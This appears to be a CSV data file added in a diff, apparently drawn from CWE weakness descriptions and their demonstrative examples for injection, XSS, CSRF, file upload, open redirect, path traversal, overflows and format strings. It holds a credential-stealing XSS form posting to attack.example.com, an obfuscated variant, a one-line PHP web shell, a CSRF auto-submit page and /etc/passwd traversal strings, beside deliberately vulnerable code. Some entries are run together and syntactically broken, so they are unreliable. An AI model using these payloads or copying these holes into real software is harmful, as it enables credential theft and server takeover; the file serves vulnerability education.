@@ -1,0 +1,378 @@
+CWE-78,"The software constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component. 
+"
+CWE-79,"
+Description:The software does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users. 
+(bad code)Example Language: PHP?
+$username = $_GET['username'];echo '<div class=""header""> Welcome, ' . $username . '</div>';
+
+(attack code)?
+http://trustedSite.example.com/welcome.php?username=<Script Language=""Javascript"">alert(""You've been attacked!"");</Script>
+
+(attack code)?
+http://trustedSite.example.com/welcome.php?username=<div id=""stealPassword"">Please Login:<form name=""input"" action=""http://attack.example.com/stealPassword.php"" method=""post"">Username: <input type=""text"" name=""username"" /><br/>Password: <input type=""password"" name=""password"" /><br/><input type=""submit"" value=""Login"" /></form></div>
+
+(result)?
+<div class=""header""> Welcome, <div id=""stealPassword""> Please Login:
+<form name=""input"" action=""attack.example.com/stealPassword.php"" method=""post"">Username: <input type=""text"" name=""username"" /><br/>Password: <input type=""password"" name=""password"" /><br/><input type=""submit"" value=""Login"" /></form>
+</div></div>
+
+(attack code)?
+trustedSite.example.com/welcome.php?username=%3Cdiv+id%3D%22stealPassword%22%3EPlease+Login%3A%3Cform+name%3D%22input%22+action%3D%22http%3A%2F%2Fattack.example.com%2FstealPassword.php%22+method%3D%22post%22%3EUsername%3A+%3Cinput+type%3D%22text%22+name%3D%22username%22+%2F%3E%3Cbr%2F%3EPassword%3A+%3Cinput+type%3D%22password%22+name%3D%22password%22+%2F%3E%3Cinput+type%3D%22submit%22+value%3D%22Login%22+%2F%3E%3C%2Fform%3E%3C%2Fdiv%3E%0D%0A
+
+(attack code)?
+trustedSite.example.com/welcome.php?username=<script+type=""text/javascript"">document.write('\u003C\u0064\u0069\u0076\u0020\u0069\u0064\u003D\u0022\u0073\u0074\u0065\u0061\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u003E\u0050\u006C\u0065\u0061\u0073\u0065\u0020\u004C\u006F\u0067\u0069\u006E\u003A\u003C\u0066\u006F\u0072\u006D\u0020\u006E\u0061\u006D\u0065\u003D\u0022\u0069\u006E\u0070\u0075\u0074\u0022\u0020\u0061\u0063\u0074\u0069\u006F\u006E\u003D\u0022\u0068\u0074\u0074\u0070\u003A\u002F\u002F\u0061\u0074\u0074\u0061\u0063\u006B\u002E\u0065\u0078\u0061\u006D\u0070\u006C\u0065\u002E\u0063\u006F\u006D\u002F\u0073\u0074\u0065\u0061\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u002E\u0070\u0068\u0070\u0022\u0020\u006D\u0065\u0074\u0068\u006F\u0064\u003D\u0022\u0070\u006F\u0073\u0074\u0022\u003E\u0055\u0073\u0065\u0072\u006E\u0061\u006D\u0065\u003A\u0020\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0074\u0065\u0078\u0074\u0022\u0020\u006E\u0061\u006D\u0065\u003D\u0022\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065\u0022\u0020\u002F\u003E\u003C\u0062\u0072\u002F\u003E\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u003A\u0020\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u0020\u006E\u0061\u006D\u0065\u003D\u0022\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u0020\u002F\u003E\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0073\u0075\u0062\u006D\u0069\u0074\u0022\u0020\u0076\u0061\u006C\u0075\u0065\u003D\u0022\u004C\u006F\u0067\u0069\u006E\u0022\u0020\u002F\u003E\u003C\u002F\u0066\u006F\u0072\u006D\u003E\u003C\u002F\u0064\u0069\u0076\u003E\u000D');</script>
+
+(bad code)Example Language: JSP?
+<% String eid = request.getParameter(""eid""); %>...Employee ID: <%= eid %>
+
+(bad code)Example Language: ASP.NET?
+<%protected System.Web.UI.WebControls.TextBox Login;protected System.Web.UI.WebControls.Label EmployeeID;...EmployeeID.Text = Login.Text;%>
+<p><asp:label id=""EmployeeID"" runat=""server"" /></p>
+
+(bad code)Example Language: JSP?
+<%Statement stmt = conn.createStatement();ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid);if (rs != null) {rs.next();String name = rs.getString(""name"");}%>
+Employee Name: <%= name %>
+
+(bad code)Example Language: ASP.NET?
+<%protected System.Web.UI.WebControls.Label EmployeeName;...string query = ""select * from emp where id="" + eid;sda = new SqlDataAdapter(query, conn);sda.Fill(dt);string name = dt.Rows[0][""Name""];...EmployeeName.Text = name;%><p><asp:label id=""EmployeeName"" runat=""server"" /></p>
+
+(bad code)Example Language: PHP?
+$username = mysql_real_escape_string($username);$fullName = mysql_real_escape_string($fullName);$query = sprintf('Insert Into users (username,password) Values (""%s"",""%s"",""%s"")', $username, crypt($password),$fullName) ;mysql_query($query);/.../
+
+(bad code)Example Language: PHP?
+$query = 'Select * From users Where loggedIn=true';$results = mysql_query($query);
+if (!$results) {exit;}
+
+//Print list of users to page
+echo '<div id=""userlist"">Currently Active Users:';while ($row = mysql_fetch_assoc($results)) {echo '<div class=""userNames"">'.$row['fullname'].'</div>';}echo '</div>';
+
+(bad code)Example Language: PHP?
+$name = $_COOKIE[""myname""];$announceStr = ""$name just logged in."";
+
+//save HTML-formatted message to file; implementation details are irrelevant for this example.
+
+    saveMessage($announceStr);
+
+(attack code)?
+<script>document.alert('Hacked');</script>
+
+(result)?
+<script>document.alert('Hacked');</script> has logged in.
+"
+CWE-80,"Description:The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special characters such as ""<"", "">"", and ""&"" that could be interpreted as web-scripting elements when they are sent to a downstream component that processes web pages. 
+(bad code)Example Language: JSP?
+<% for (Iterator i = guestbook.iterator(); i.hasNext(); ) {Entry e = (Entry) i.next(); %><p>Entry #<%= e.getId() %></p><p><%= e.getText() %></p><%} %>
+
+"
+CWE-352,"
+Description:The web application does not, or can not, sufficiently verify whether a well-formed, valid, consistent request was intentionally provided by the user who submitted the request. 
+(bad code)Example Language: HTML?
+<form action=""/url/profile.php"" method=""post""><input type=""text"" name=""firstname""/><input type=""text"" name=""lastname""/><br/><input type=""text"" name=""email""/><input type=""submit"" name=""submit"" value=""Update""/></form>
+
+(bad code)Example Language: PHP?
+// initiate the session in order to validate sessions
+session_start();
+
+//if the session is registered to a valid user then allow update
+
+if (! session_is_registered(""username"")) {
+
+echo ""invalid session detected!"";
+
+// Redirect user to login page
+[...]
+exit;
+}
+
+// The user session is valid, so process the request
+
+
+// and update the information
+
+update_profile();
+function update_profile {
+
+
+// read in the data from $POST and send an update
+
+
+// to the database
+SendUpdateToDatabase($_SESSION['username'], $_POST['email']);[...]echo ""Your profile has been successfully updated."";
+}
+
+(attack code)Example Language: HTML?
+<SCRIPT>function SendAttack () {form.email = ""attacker@example.com"";
+// send to profile.php
+form.submit();}</SCRIPT>
+<BODY onload=""javascript:SendAttack();"">
+<form action=""http://victim.example.com/profile.php"" id=""form"" method=""post""><input type=""hidden"" name=""firstname"" value=""Funny""><input type=""hidden"" name=""lastname"" value=""Joke""><br/><input type=""hidden"" name=""email""></form>
+"
+CWE-434,"
+Description:The software allows the attacker to upload or transfer files of dangerous types that can be automatically processed within the product's environment. 
+(good code)Example Language: HTML?
+<form action=""upload_picture.php"" method=""post"" enctype=""multipart/form-data"">
+Choose a file to upload:<input type=""file"" name=""filename""/><br/><input type=""submit"" name=""submit"" value=""Submit""/>
+</form>
+
+(bad code)Example Language: PHP?
+
+
+// Define the target location where the picture being
+
+
+// uploaded is going to be saved.
+$target = ""pictures/"" . basename($_FILES['uploadedfile']['name']);
+
+// Move the uploaded file to the new location.
+if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target)){echo ""The picture has been successfully uploaded."";}else{echo ""There was an error uploading the picture, please try again."";}
+
+(attack code)?
+malicious.php
+
+(attack code)Example Language: PHP?
+<?phpsystem($_GET['cmd']);
+?>
+
+(attack code)?
+http://server.example.com/upload_dir/malicious.php?cmd=ls%20-l
+
+(good code)Example Language: HTML?
+<form action=""FileUploadServlet"" method=""post"" enctype=""multipart/form-data"">
+Choose a file to upload:<input type=""file"" name=""filename""/><br/><input type=""submit"" name=""submit"" value=""Submit""/>
+</form>
+
+(bad code)Example Language: Java?
+public class FileUploadServlet extends HttpServlet {
+
+...
+protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+
+response.setContentType(""text/html"");PrintWriter out = response.getWriter();String contentType = request.getContentType();
+// the starting position of the boundary headerint ind = contentType.indexOf(""boundary="");String boundary = contentType.substring(ind+9);
+String pLine = new String();String uploadLocation = new String(UPLOAD_DIRECTORY_STRING); //Constant value
+// verify that content type is multipart form dataif (contentType != null && contentType.indexOf(""multipart/form-data"") != -1) {
+
+// extract the filename from the Http headerBufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream()));...pLine = br.readLine();String filename = pLine.substring(pLine.lastIndexOf(""\\""), pLine.lastIndexOf(""\""""));...
+// output the file to the local upload directorytry {
+BufferedWriter bw = new BufferedWriter(new FileWriter(uploadLocation+filename, true));for (String line; (line=br.readLine())!=null; ) {if (line.indexOf(boundary) == -1) {bw.write(line);bw.newLine();bw.flush();}} //end of for loopbw.close();
+
+
+} catch (IOException ex) {...}// output successful upload response HTML page
+}// output unsuccessful upload response HTML pageelse{...}
+}...
+
+}
+"
+CWE-601,"
+Description:A web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a Redirect. This simplifies phishing attacks. 
+(bad code)Example Language: PHP?
+$redirect_url = $_GET['url'];header(""Location: "" . $redirect_url);
+
+(attack code)?
+http://example.com/example.php?url=http://malicious.example.com
+
+(bad code)Example Language: Java?
+public class RedirectServlet extends HttpServlet {
+
+protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {String query = request.getQueryString();if (query.contains(""url"")) {String url = request.getParameter(""url"");response.sendRedirect(url);}}
+}
+
+(attack code)Example Language: HTML?
+<a href=""http://bank.example.com/redirect?url=http://attacker.example.net"">Click here to log in</a>
+
+CWE-22
+Description:The software uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the software does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory. 
+(bad code)Example Language: Perl?
+my $dataPath = ""/users/cwe/profiles"";my $username = param(""user"");my $profilePath = $dataPath . ""/"" . $username;
+open(my $fh, ""<$profilePath"") || ExitError(""profile read error: $profilePath"");print ""<ul>\n"";while (<$fh>) {print ""<li>$_</li>\n"";}print ""</ul>\n"";
+
+(attack code)?
+../../../etc/passwd
+
+(result)?
+/users/cwe/profiles/../../../etc/passwd
+
+(result)?
+/etc/passwd
+
+(bad code)Example Language: Java?
+String filename = System.getProperty(""com.domain.application.dictionaryFile"");File dictionaryFile = new File(filename);
+
+(bad code)Example Language: Perl?
+my $Username = GetUntrustedInput();$Username =~ s/\.\.\///;my $filename = ""/home/user/"" . $Username;ReadAndSendFile($filename);
+
+(attack code)?
+../../../etc/passwd
+
+(result)?
+../../etc/passwd
+
+(result)?
+/home/user/../../etc/passwd
+
+(bad code)Example Language: Java?
+String path = getInputPath();if (path.startsWith(""/safe_dir/"")){File f = new File(path);f.delete()}
+
+(attack code)?
+/safe_dir/../important.dat
+
+(good code)Example Language: HTML?
+<form action=""FileUploadServlet"" method=""post"" enctype=""multipart/form-data"">
+Choose a file to upload:
+<input type=""file"" name=""filename""/><br/><input type=""submit"" name=""submit"" value=""Submit""/>
+</form>
+
+(bad code)Example Language: Java?
+public class FileUploadServlet extends HttpServlet {
+...
+protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {response.setContentType(""text/html"");PrintWriter out = response.getWriter();String contentType = request.getContentType();
+
+// the starting position of the boundary header
+int ind = contentType.indexOf(""boundary="");String boundary = contentType.substring(ind+9);
+String pLine = new String();String uploadLocation = new String(UPLOAD_DIRECTORY_STRING); //Constant value
+
+// verify that content type is multipart form data
+if (contentType != null && contentType.indexOf(""multipart/form-data"") != -1) {
+// extract the filename from the Http headerBufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream()));...pLine = br.readLine();String filename = pLine.substring(pLine.lastIndexOf(""\\""), pLine.lastIndexOf(""\""""));...
+
+// output the file to the local upload directory
+try {BufferedWriter bw = new BufferedWriter(new FileWriter(uploadLocation+filename, true));for (String line; (line=br.readLine())!=null; ) {if (line.indexOf(boundary) == -1) {bw.write(line);bw.newLine();bw.flush();}} //end of for loopbw.close();} catch (IOException ex) {...}
+
+// output successful upload response HTML page
+
+
+}
+// output unsuccessful upload response HTML page
+else{...}}
+...
+
+}"
+CWE-120,"
+Description:The program copies an input buffer to an output buffer without verifying that the size of the input buffer is less than the size of the output buffer, leading to a buffer overflow. 
+(bad code)Example Language: C?
+char last_name[20];printf (""Enter your last name: "");scanf (""%s"", last_name);
+
+(bad code)Example Language: C?
+void manipulate_string(char* string){char buf[24];strcpy(buf, string);...}
+
+(bad code)Example Language: C?
+
+char buf[24];printf(""Please enter your name and press <Enter>\n"");gets(buf);...}
+
+(bad code)Example Language: C?
+...
+struct hostent *clienthp;char hostname[MAX_LEN];
+// create server socket, bind to server address and listen on socket...
+// accept client connections and process requestsint count = 0;for (count = 0; count < MAX_CONNECTIONS; count++) {
+
+int clientlen = sizeof(struct sockaddr_in);int clientsocket = accept(serversocket, (struct sockaddr *)&clientaddr, &clientlen);
+if (clientsocket >= 0) {
+clienthp = gethostbyaddr((char*) &clientaddr.sin_addr.s_addr, sizeof(clientaddr.sin_addr.s_addr), AF_INET);strcpy(hostname, clienthp->h_name);logOutput(""Accepted client connection from host "", hostname);
+// process client request...close(clientsocket);
+}
+}close(serversocket);
+
+...
+"
+CWE-131,"
+Description:The software does not correctly calculate the size to be used when allocating a buffer, which could lead to a buffer overflow. 
+(bad code)Example Language: C?
+int i;unsigned int numWidgets;Widget **WidgetList;
+numWidgets = GetUntrustedSizeValue();if ((numWidgets == 0) || (numWidgets > MAX_NUM_WIDGETS)) {ExitError(""Incorrect number of widgets requested!"");}WidgetList = (Widget **)malloc(numWidgets * sizeof(Widget *));printf(""WidgetList ptr=%p\n"", WidgetList);for(i=0; i<numWidgets; i++) {WidgetList[i] = InitializeWidget();}WidgetList[numWidgets] = NULL;showWidgets(WidgetList);
+
+(bad code)Example Language: C?
+img_t table_ptr; /*struct containing img data, 10kB each*/int num_imgs;...num_imgs = get_num_imgs();table_ptr = (img_t*)malloc(sizeof(img_t)*num_imgs);...
+
+(bad code)Example Language: C?
+char * copy_input(char *user_supplied_string){
+int i, dst_index;char *dst_buf = (char*)malloc(4*sizeof(char) * MAX_SIZE);if ( MAX_SIZE <= strlen(user_supplied_string) ){die(""user string too long, die evil hacker!"");}dst_index = 0;for ( i = 0; i < strlen(user_supplied_string); i++ ){
+if( '&' == user_supplied_string[i] ){dst_buf[dst_index++] = '&';dst_buf[dst_index++] = 'a';dst_buf[dst_index++] = 'm';dst_buf[dst_index++] = 'p';dst_buf[dst_index++] = ';';}else if ('<' == user_supplied_string[i] ){
+
+
+/* encode to &lt; */
+
+
+}else dst_buf[dst_index++] = user_supplied_string[i];
+}return dst_buf;
+}
+
+(bad code)Example Language: C?
+DataPacket *packet;int numHeaders;PacketHeader *headers;
+sock=AcceptSocketConnection();ReadPacket(packet, sock);numHeaders =packet->headers;
+if (numHeaders > 100) {ExitError(""too many headers!"");}headers = malloc(numHeaders * sizeof(PacketHeader);ParsePacketHeaders(packet, headers);
+
+(bad code)Example Language: C?
+int *id_sequence;
+
+/* Allocate space for an array of three ids. */
+
+
+id_sequence = (int*) malloc(3);if (id_sequence == NULL) exit(1);
+
+/* Populate the id array. */
+
+
+id_sequence[0] = 13579;id_sequence[1] = 24680;id_sequence[2] = 97531;
+"
+CWE-134,"
+Description:The software uses a function that accepts a format string as an argument, but the format string originates from an external source. 
+(bad code)Example Language: C?
+#include <stdio.h>
+void printWrapper(char *string) {
+
+printf(string);
+}
+int main(int argc, char **argv) {
+
+char buf[5012];memcpy(buf, argv[1], 5012);printWrapper(argv[1]);return (0);
+}
+
+(bad code)Example Language: C?
+int main(int argc, char **argv){char buf[128];...snprintf(buf,128,argv[1]);}
+
+(bad code)Example Language: C?
+printf(""%d %d %1$d %1$d\n"", 5, 9);"
+CWE-190,"
+Description:The software performs a calculation that can produce an integer overflow or wraparound, when the logic assumes that the resulting value will always be larger than the original value. This can introduce other weaknesses when the calculation is used for resource management or execution control. 
+(bad code)Example Language: C?
+img_t table_ptr; /*struct containing img data, 10kB each*/int num_imgs;...num_imgs = get_num_imgs();table_ptr = (img_t*)malloc(sizeof(img_t)*num_imgs);...
+
+(bad code)Example Language: C?
+nresp = packet_get_int();if (nresp > 0) {response = xmalloc(nresp*sizeof(char*));for (i = 0; i < nresp; i++) response[i] = packet_get_string(NULL);}
+
+(bad code)Example Language: C?
+short int bytesRec = 0;char buf[SOMEBIGNUM];
+while(bytesRec < MAXGET) {bytesRec += getFromInput(buf+bytesRec);}
+
+(bad code)Example Language: C?
+#define JAN 1#define FEB 2#define MAR 3
+short getMonthlySales(int month) {...}
+float calculateRevenueForQuarter(short quarterSold) {...}
+int determineFirstQuarterRevenue() {
+
+
+// Variable for sales revenue for the quarter
+float quarterRevenue = 0.0f;
+short JanSold = getMonthlySales(JAN); /* Get sales in January */short FebSold = getMonthlySales(FEB); /* Get sales in February */short MarSold = getMonthlySales(MAR); /* Get sales in March */
+
+// Calculate quarterly total
+short quarterSold = JanSold + FebSold + MarSold;
+
+// Calculate the total revenue for the quarter
+quarterRevenue = calculateRevenueForQuarter(quarterSold);
+saveFirstQuarterRevenue(quarterRevenue);
+return 0;
+}
+
+(good code)Example Language: C?
+...float calculateRevenueForQuarter(long quarterSold) {...}
+int determineFirstQuarterRevenue() {
+...
+// Calculate quarterly total
+long quarterSold = JanSold + FebSold + MarSold;
+
+// Calculate the total revenue for the quarter
+quarterRevenue = calculateRevenueForQuarter(quarterSold);
+...
+}
+"
